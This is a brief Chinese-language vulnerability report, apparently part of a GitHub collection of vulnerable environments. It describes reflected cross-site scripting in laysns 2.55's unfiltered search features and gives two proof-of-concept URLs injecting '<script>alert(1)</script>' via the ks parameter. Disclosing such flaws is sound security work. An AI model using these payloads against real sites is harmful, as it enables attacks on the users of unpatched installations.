laysns 2.55版本中存在XSS漏洞。搜索处没有进行任何的过滤。输入<script>alert(1)</script>即可
/soso.html?ks=13<script>alert(1)</script>


![image](https://github.com/guobaoyou/vul_environment/blob/master/laysns_xss/1.jpg)


另外一处在bbs的搜索处，即
/search.html?ks=55"/><script>alert(1)</script>
